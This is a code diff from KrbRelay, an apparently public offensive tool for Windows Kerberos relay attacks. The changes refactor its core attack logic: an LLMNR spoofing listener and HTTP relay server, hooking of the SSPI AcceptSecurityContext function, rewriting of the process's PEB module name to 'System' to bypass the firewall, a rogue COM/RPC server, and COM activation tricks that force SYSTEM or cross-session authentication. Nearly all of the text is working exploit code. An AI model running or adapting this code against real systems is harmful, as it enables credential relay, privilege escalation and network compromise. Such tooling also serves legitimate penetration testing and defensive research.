+                if (!String.IsNullOrEmpty(argSpooferIP))
+                {
+                    try
+                    {
+                        IPAddress.Parse(argSpooferIP);
+                    }
+                    catch
+                    {
+                        throw new ArgumentException("SpooferIP value must be an IP address");
+                    }
+                }
+                if (!String.IsNullOrEmpty(argSpooferIPv6))
+                {
+                    try
+                    {
+                        IPAddress.Parse(argSpooferIPv6);
+                    }
+                    catch
+                    {
+                        throw new ArgumentException("SpooferIP value must be an IP address");
+                    }
+                }
                 if (string.IsNullOrEmpty(argSpooferIP))
                 {
                     argSpooferIP = Spoofing.Util.GetLocalIPAddress("IPv4");
@@ -827,74 +741,73 @@ namespace KrbRelay
                 //    spoofSPN = targetFQDN.Split('.')[0];
                 //else
                 //    spoofSPN = targetFQDN;
-                spoofSPN = targetFQDN.Split('.')[0];
+                spoofSPN = State.targetFQDN.Split('.')[0];
 
-                Thread llmnrListenerThread = new Thread(() => Spoofing.LLMNR.LLMNRListener(argSpooferIP, argSpooferIP, argSpooferIPv6, argLLMNRTTL, "IPv4", spoofSPN));
+                Thread llmnrListenerThread = new Thread(
+                    () =>
+                        Spoofing.LLMNR.LLMNRListener(
+                            argSpooferIP,
+                            argSpooferIP,
+                            argSpooferIPv6,
+                            argLLMNRTTL,
+                            "IPv4",
+                            spoofSPN
+                        )
+                );
                 llmnrListenerThread.Start();
 
-                //http
                 Spoofing.HttpRelayServer.start(service, argSpooferIP);
-                //Thread httpRelayServerThread = new Thread(() => Spoofing.HttpRelayServer.start(targetFQDN, useSSL, service));
-                //httpRelayServerThread.Start();
 
                 return;
             }
 
-            //get value for AcceptSecurityContex
-            Console.WriteLine("[*] Rewriting function table");
-            IntPtr functionTable = InitSecurityInterface();
-            //Console.WriteLine("[*] functionTable: {0}", functionTable);
-            SecurityFunctionTable table = (SecurityFunctionTable)Marshal.PtrToStructure(functionTable, typeof(SecurityFunctionTable));
-            //Console.WriteLine("[*] Old AcceptSecurityContex: {0}", table.AcceptSecurityContex);
+            // Hook SSPI Functions
 
-            //overwrite AcceptSecurityContex
-            IntPtr hProcess = OpenProcess(0x001F0FFF, false, Process.GetCurrentProcess().Id);
-            AcceptSecurityContextFunc AcceptSecurityContextDeleg = new AcceptSecurityContextFunc(AcceptSecurityContext_);
-            byte[] bAcceptSecurityContext = BitConverter.GetBytes(Marshal.GetFunctionPointerForDelegate(AcceptSecurityContextDeleg).ToInt64());
-            int oAcceptSecurityContext = Helpers.FieldOffset<SecurityFunctionTable>("AcceptSecurityContex");
-            Marshal.Copy(bAcceptSecurityContext, 0, (IntPtr)functionTable + oAcceptSecurityContext, bAcceptSecurityContext.Length);
-            //get new value
-            table = (SecurityFunctionTable)Marshal.PtrToStructure(functionTable, typeof(SecurityFunctionTable));
-            //Console.WriteLine("[*] New AcceptSecurityContex: {0}", table.AcceptSecurityContex);
+            SSPIHooks sspiHooks = new SSPIHooks();
+            sspiHooks.Hook();
 
-            //Console.WriteLine();
-            Console.WriteLine("[*] Rewriting PEB");
-            //Init RPC server
-            var svcs = new SOLE_AUTHENTICATION_SERVICE[] {
-                new SOLE_AUTHENTICATION_SERVICE() {
+            // Prepare PEB->imagePathName (firewall bypass) and initialize COM/RPC
+
+            string original = Helpers.SetProcessModuleName("System");
+
+            var svcs = new SOLE_AUTHENTICATION_SERVICE[]
+            {
+                new SOLE_AUTHENTICATION_SERVICE()
+                {
                     dwAuthnSvc = 16, // HKLM\SOFTWARE\Microsoft\Rpc\SecurityService sspicli.dll
-                    pPrincipalName = spn
+                    pPrincipalName = State.spn
                 }
             };
-            //bypass firewall restriction by overwriting checks on PEB
-            string str = SetProcessModuleName("System");
-            StringBuilder fileName = new StringBuilder(1024);
-            GetModuleFileName(IntPtr.Zero, fileName, fileName.Capacity);
-            Console.WriteLine("[*] GetModuleFileName: {0}", fileName);
+
+            int result;
+
             try
             {
-                Console.WriteLine("[*] Init com server");
-                CoInitializeSecurity(IntPtr.Zero, svcs.Length, svcs,
-                     IntPtr.Zero, AuthnLevel.RPC_C_AUTHN_LEVEL_DEFAULT,
-                     ImpLevel.RPC_C_IMP_LEVEL_IMPERSONATE, IntPtr.Zero,
-                     Natives.EOLE_AUTHENTICATION_CAPABILITIES.EOAC_DYNAMIC_CLOAKING,
-                     IntPtr.Zero);
+                result = Interop.CoInitializeSecurity(
+                    IntPtr.Zero,
+                    svcs.Length,
+                    svcs,
+                    IntPtr.Zero,
+                    AuthnLevel.Default,
+                    ImpLevel.Impersonate,
+                    IntPtr.Zero,
+                    AuthenticationCapabilities.DynamicCloaking,
+                    IntPtr.Zero
+                );
+                Console.WriteLine("[*] CoInitializeSecurity: 0x{0:X8}", result);
             }
             finally
             {
-                string str2 = SetProcessModuleName(str);
-                fileName.Clear();
-                GetModuleFileName(IntPtr.Zero, fileName, fileName.Capacity);
-                Console.WriteLine("[*] GetModuleFileName: {0}", fileName);
-                //Console.WriteLine();
+                Helpers.SetProcessModuleName(original);
             }
 
-            //Unable to call other com objects before doing the CoInitializeSecurity step
-            //Make sure that we'll use an available port
-            if (!checkPort(int.Parse(port)))
+            // Unable to call other com objects before doing the CoInitializeSecurity step
+            // Make sure that we'll use an available port
+
+            if (!Helpers.CheckFirewallPort(int.Parse(port)))
             {
                 Console.WriteLine("[*] Looking for available ports..");
-                port = checkPorts(new string[] { "SYSTEM" }).ToString();
+                port = Helpers.CheckAllFirewallPorts(new string[] { "SYSTEM" }).ToString();
                 if (port == "-1")
                 {
                     Console.WriteLine("[-] No available ports found");
@@ -904,52 +817,68 @@ namespace KrbRelay
                 Console.WriteLine("[*] Port {0} available", port);
             }
 
-            //COM object
-            Console.WriteLine("[*] Register com server");
+            // Prepare our object and objref
+
+            Console.WriteLine("[*] Register COM server @ 127.0.0.1:{0}", port);
             byte[] ba = ComUtils.GetMarshalledObject(new object());
             COMObjRefStandard std = (COMObjRefStandard)COMObjRefStandard.FromArray(ba);
-            //Console.WriteLine("[*] IPID: {0}", std.Ipid);
-            //Console.WriteLine("[*] OXID: {0:X08}", std.Oxid);
-            //Console.WriteLine("[*] OID : {0:X08}", std.Oid);
             std.StringBindings.Clear();
             std.StringBindings.Add(new COMStringBinding(RpcTowerId.Tcp, "127.0.0.1"));
-            Console.WriteLine(std.ToMoniker());
+            Console.WriteLine("[*] ObjRef: {0}", std.ToMoniker());
+
             //std.SecurityBindings.Clear();
             //std.SecurityBindings.Add(new COMSecurityBinding(RpcAuthnService.GSS_Kerberos, spn));
 
-            RpcServerUseProtseqEp("ncacn_ip_tcp", 20, port, IntPtr.Zero);
-            RpcServerRegisterAuthInfo(null, 16, IntPtr.Zero, IntPtr.Zero);
+            Interop.RpcServerUseProtseqEp("ncacn_ip_tcp", 20, port, IntPtr.Zero);
+            Interop.RpcServerRegisterAuthInfo(null, 16, IntPtr.Zero, IntPtr.Zero);
 
-            // Initialized IStorage
-            IStorage stg;
-            ILockBytes lb;
-            int result;
+            // Initialize IStorage
+
             result = Ole32.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes);
-            result = Ole32.StgCreateDocfileOnILockBytes(lockBytes, Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE, 0, out IStorage storage);
+            result = Ole32.StgCreateDocfileOnILockBytes(
+                lockBytes,
+                Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE,
+                0,
+                out IStorage storage
+            );
             Ole32.MULTI_QI[] qis = new Ole32.MULTI_QI[1];
-            //insert our ObjRef(std) in the StorageTrigger
-            StorageTrigger storageTrigger = new StorageTrigger(storage, "127.0.0.1", TowerProtocol.EPM_PROTOCOL_TCP, std);
+
+            // Insert our ObjRef(std) in the StorageTrigger
+
+            StorageTrigger storageTrigger = new StorageTrigger(
+                storage,
+                "127.0.0.1",
+                TowerProtocol.EPM_PROTOCOL_TCP,
+                std
+            );
             qis[0].pIID = Ole32.IID_IUnknownPtr;
             qis[0].pItf = null;
             qis[0].hr = 0;
 
             if (sessionID == -123)
             {
-                Console.WriteLine();
                 Console.WriteLine("[*] Forcing SYSTEM authentication");
                 Console.WriteLine("[*] Using CLSID: {0}", clsId_guid);
                 try
                 {
-                    result = Ole32.CoGetInstanceFromIStorage(null, ref clsId_guid, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, storageTrigger, 1, qis);
+                    result = Ole32.CoGetInstanceFromIStorage(
+                        null,
+                        ref clsId_guid,
+                        null,
+                        Ole32.CLSCTX.CLSCTX_LOCAL_SERVER,
+                        storageTrigger,
+                        1,
+                        qis
+                    );
                 }
                 catch (Exception e)
                 {
+                    Console.WriteLine("[*] CoGetInstanceFromIStorage error (this is probably expected):\n");
                     Console.WriteLine(e);
                 }
             }
             else
             {
-                Console.WriteLine();
                 Console.WriteLine("[*] Forcing cross-session authentication");
                 Console.WriteLine("[*] Using CLSID: {0}", clsId_guid);
 
@@ -957,26 +886,42 @@ namespace KrbRelay
                 Guid CLSID_ComActivator = new Guid("{0000033C-0000-0000-c000-000000000046}");
                 Guid IID_IStandardActivator = typeof(IStandardActivator).GUID;
                 var pComAct = (IStandardActivator)new StandardActivator();
-                uint result2 = Ole32.CoCreateInstance(ref CLSID_ComActivator, null, 0x1, ref IID_IStandardActivator, out object instance);
+                uint result2 = Ole32.CoCreateInstance(
+                    ref CLSID_ComActivator,
+                    null,
+                    0x1,
+                    ref IID_IStandardActivator,
+                    out object instance
+                );
                 pComAct = (IStandardActivator)instance;
 
                 if (sessionID != -123)
                 {
-                    ISpecialSystemPropertiesActivator props = (ISpecialSystemPropertiesActivator)pComAct;
+                    ISpecialSystemPropertiesActivator props =
+                        (ISpecialSystemPropertiesActivator)pComAct;
                     Console.WriteLine("[*] Spawning in session {0}", sessionID);
                     props.SetSessionId(sessionID, 0, 1);
                 }
                 try
                 {
-                    result = pComAct.StandardGetInstanceFromIStorage(null, clsId_guid, IntPtr.Zero, CLSCTX.LOCAL_SERVER, storageTrigger, 1, qis);
+                    result = pComAct.StandardGetInstanceFromIStorage(
+                        null,
+                        clsId_guid,
+                        IntPtr.Zero,
+                        CLSCTX.LOCAL_SERVER,
+                        storageTrigger,
+                        1,
+                        qis
+                    );
                 }
                 catch (Exception e)
                 {
+                    Console.WriteLine("[*] StandardGetInstanceFromIStorage error (this is probably expected):\n");
                     Console.WriteLine(e);
                 }
-                //Console.WriteLine("[*] StandardGetInstanceFromIStoragee: {0}", result);
             }
-            //Marshal.BindToMoniker(std.ToMoniker());
+
+            return;
         }
     }
 }
